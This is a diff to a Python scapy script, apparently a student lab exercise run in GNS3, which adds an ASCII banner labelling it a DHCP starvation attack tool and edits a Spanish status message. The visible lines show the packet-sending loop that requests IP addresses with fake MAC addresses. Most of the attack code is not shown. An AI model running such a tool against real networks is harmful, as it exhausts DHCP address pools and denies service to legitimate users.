@@ -1,3 +1,16 @@
+"""
+██████╗ ██╗  ██╗ ██████╗██████╗ 
+██╔══██╗██║  ██║██╔════╝██╔══██╗
+██║  ██║███████║██║     ██████╔╝
+██║  ██║██╔══██║██║     ██╔═══╝ 
+██████╔╝██║  ██║╚██████╗██║     
+╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝     
+
+      DHCP STARVATION ATTACK TOOL
+
+      AUTOR: cristopher 2024-1414
+      
+"""
 #!/usr/bin/env python3
 from scapy.all import *
 import time
@@ -29,7 +42,7 @@ try:
         # 4. Enviar (verbose=0 para que no llene la pantalla)
         sendp(pkt, iface=interface, verbose=0)
         
-        print(f"\r[+] IPs solicitadas con MACs falsas... (Ctrl+C para parar)", end="")
+        print(f"\r[+] DIC IP solicitadas con MAC falsas... (Ctrl+C para parar)", end="")
         # Pequeña pausa para no colgar tu GNS3
         time.sleep(0.05)
 
